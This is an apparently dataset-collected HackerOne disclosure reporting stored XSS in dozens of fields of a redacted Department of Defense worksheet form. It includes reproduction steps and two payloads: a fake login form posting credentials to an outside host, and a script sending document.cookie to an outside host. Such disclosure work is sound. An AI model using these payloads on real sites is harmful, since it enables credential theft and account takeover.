---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '847176'
original_report_id: '847176'
title: Stored XSS via 64(?) vulnerable fields in ███ leads to credential theft/account
  takeover
weakness: Cross-site Scripting (XSS) - Stored
team_handle: deptofdefense
created_at: '2020-04-11T08:39:44.046Z'
disclosed_at: '2021-02-10T21:07:10.472Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 7
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# Stored XSS via 64(?) vulnerable fields in ███ leads to credential theft/account takeover

## Metadata

- HackerOne Report ID: 847176
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: deptofdefense
- Disclosed At: 2021-02-10T21:07:10.472Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
A user is able to complete a ████████ worksheets via https://██████████. This form allows a user to store multiple XSS payloads within, which will in turn allow the attacker to run malicious code in context of the legal personnel who view the request.

## Impact
The attacker can have multiple effects from this vulnerability, to include but not limited to account compromise, keystroke logging, drive-by downloads, and much more.

## Step-by-step Reproduction Instructions

1. Browse to https://█████
████████
2. Click `█████████`. Once on the ██████ page, click `███ and ████████`
██████████
3. Click `Continue`.
██████
4. Fill in your name and click `Submit`. XSS payloads seem to be sanitized properly here from basic tests.
███
5. Any field that accepts text in the rest of the document seems vulnerable to XSS. Complete the form, filling in XSS payloads anywhere you can type. I counted 64 vulnerable fields total.
█████████
7. Click `Finish`. You will see a confirmation that your request was submitting and receive a ticket number.
█████████
8. Click `██████`, or return to the `███████` page and put in your info in the `█████` area to modify the worksheet. The XSS will fire in both locations.
█████████
9. To demonstrate credential theft/account takeover, I used the following (very obvious) payload. There are various ways an attacker could do this and nothing seems to be filtered:

```
<h3>Please login to proceed</h3> <form action=http://██████>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
```
█████████
███

An attacker can also redirect the user as soon as the worksheet is opened, but as an unauthenticated user I was unable to test for cookie theft:
`<script>window.location="http://███/?cookie=" + document.cookie</script>`
██████

## Suggested Mitigation/Remediation Actions
Sanitize any fields where user input is reflected and disallow special characters from being submitted in each form field.

## Impact

The attacker can have multiple effects from this vulnerability, to include but not limited to account compromise, keystroke logging, drive-by downloads, and much more.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
